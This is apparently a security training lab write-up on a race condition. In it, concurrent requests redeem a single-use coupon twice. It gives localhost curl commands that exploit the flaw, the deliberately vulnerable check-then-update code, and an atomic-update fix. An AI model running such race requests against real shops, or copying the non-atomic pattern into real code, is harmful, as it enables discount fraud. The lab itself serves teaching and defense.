# Lab 16 — Coupon Code Multiple Redemption

## 1. Objective

Demonstrate how a non-atomic Time-of-Check to Time-of-Use (TOCTOU) condition enables users to redeem single-use discount coupons multiple times through concurrent requests.

## 2. Scenario

An e-commerce platform provides promotional coupon codes (such as `WELCOME10` with `max_uses = 1`). When a customer applies a coupon to an order, the server verifies whether `times_used < max_uses`, calculates the discounted total, and increments the redemption count. Because the balance check and the counter update occur in separate non-atomic operations, multiple concurrent requests can pass the check before the count is updated.

**Trust boundary:** The application assumed that sequential verification steps in application code are safe from concurrent execution.

## 3. Preconditions

| Item | Value |
|------|-------|
| Target endpoint | `/lab/logic/logic-01/apply-coupon` |
| Test coupon | `WELCOME10` (`max_uses: 1`, `discount_pct: 10`) |
| Authenticated user | `alice` / `alice123` |
| Seed state | Initial database seed (`POST /lab/logic/logic-01/reset`) |

## 4. Vulnerability Mechanism

The vulnerable endpoint checks eligibility:

```sql
SELECT * FROM coupons WHERE code = ?
```

The application logic evaluates `if coupon['times_used'] >= coupon['max_uses']`. If valid, it computes the discount and then issues:

```sql
UPDATE coupons SET times_used = times_used + 1 WHERE id = ?
```

When two or more requests arrive concurrently within milliseconds, both read `times_used = 0`, both pass the limit check, and both successfully apply the discount, resulting in `times_used` exceeding `max_uses`.

## 5. Reproduction

1. Log in as `alice`:

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. Reset the coupon usage counter:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/logic/logic-01/reset
```

3. Dispatch concurrent requests applying `WELCOME10` using parallel workers or curl scripts:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/logic/logic-01/apply-coupon \
  -H "Content-Type: application/json" \
  -d '{"code": "WELCOME10", "order_amount": 100.0}' &
curl -b cookies.txt -X POST http://localhost:5000/lab/logic/logic-01/apply-coupon \
  -H "Content-Type: application/json" \
  -d '{"code": "WELCOME10", "order_amount": 100.0}' &
wait
```

4. Check the coupon usage status:

```bash
curl -b cookies.txt http://localhost:5000/lab/logic/logic-01/coupons
```

## 6. Evidence

Both requests return HTTP 200 indicating successful discount application:

```json
{
  "code": "WELCOME10",
  "discount_amount": 10.0,
  "final_amount": 90.0,
  "status": "applied",
  "times_used": 2
}
```

The `WELCOME10` coupon was redeemed twice despite having a strict limit of 1.

## 7. Root Cause

**File:** `app/routes/logic.py`  
**Function:** `lab16_apply_coupon()`

The verification logic checks `times_used` in Python memory before writing the incremented counter in a separate database query:

```python
if patched:
    cur = db.execute(
        "UPDATE coupons SET times_used = times_used + 1 WHERE code = ? AND times_used < max_uses",
        (code,)
    )
    db.commit()
    if cur.rowcount == 0:
        return jsonify({'error': 'Coupon invalid or fully redeemed'}), 400
else:
    coupon = db.execute("SELECT * FROM coupons WHERE code = ?", (code,)).fetchone()
    if coupon['times_used'] >= coupon['max_uses']:
        return jsonify({'error': 'Coupon fully redeemed'}), 400
    db.execute("UPDATE coupons SET times_used = times_used + 1 WHERE id = ?", (coupon['id'],))
    db.commit()
```

## 8. Impact

Attackers can exhaust promotional budgets, purchase merchandise below cost, or stack single-use vouchers across multiple orders.

## 9. Remediation

Perform atomic conditional database updates where the limit condition is part of the `UPDATE` statement's `WHERE` clause, and check `rowcount`:

```python
cur = db.execute(
    "UPDATE coupons SET times_used = times_used + 1 WHERE code = ? AND times_used < max_uses",
    (code,)
)
db.commit()
if cur.rowcount == 0:
    return jsonify({'error': 'Coupon invalid or fully redeemed'}), 400
```

## 10. Regression Validation

**Test:** `tests/test_lab_16.py`

- **Vulnerable mode:** Non-atomic check-then-act allows duplicate redemptions.
- **Patched mode:** Atomic conditional update rejects subsequent redemptions once `max_uses` is met (HTTP 400).
- **Legitimate flow:** Single redemption of valid coupon calculates discount accurately.

## 11. Research Discussion

1. Why are application-level locks (e.g., Python `threading.Lock`) insufficient in multi-process or multi-worker deployment architectures (such as Gunicorn or Celery)?
2. How do optimistic locking vs. pessimistic database locking strategies compare when handling high-concurrency e-commerce promotions?
3. What role do distributed locks (e.g. Redlock) play in microservice architectures processing financial transactions?
